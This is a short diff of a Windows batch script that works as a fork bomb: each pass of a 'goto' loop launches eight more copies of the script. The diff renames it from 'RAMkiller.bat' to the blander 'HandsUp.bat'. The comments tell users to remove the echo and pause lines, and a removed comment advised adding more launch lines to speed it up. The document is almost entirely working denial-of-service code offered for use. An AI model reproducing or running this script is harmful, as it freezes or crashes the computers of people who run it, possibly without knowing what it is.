@@ -5,7 +5,6 @@ color 0a
 
 
 rem READ THESE
-rem To make the program work faster, just copy-paste "start RAMkiller.bat" where it says to farther down
 rem You'll want to delete:
 rem	The "echo" commands below
 rem 	The "pause" command below
@@ -24,16 +23,15 @@ pause
 
 goto 2
 
-type RAMK.txt
-start RAMkiller.bat
-start RAMkiller.bat
-start RAMkiller.bat
-start RAMkiller.bat
-start RAMkiller.bat
-start RAMkiller.bat
-start RAMkiller.bat
-start RAMkiller.bat
-rem Here's where you'll want to copy-paste "start RAMkiller.bat"
+type HandsUptxt.txt
+start HandsUp.bat
+start HandsUp.bat
+start HandsUp.bat
+start HandsUp.bat
+start HandsUp.bat
+start HandsUp.bat
+start HandsUp.bat
+start HandsUp.bat
 
 goto 1
 
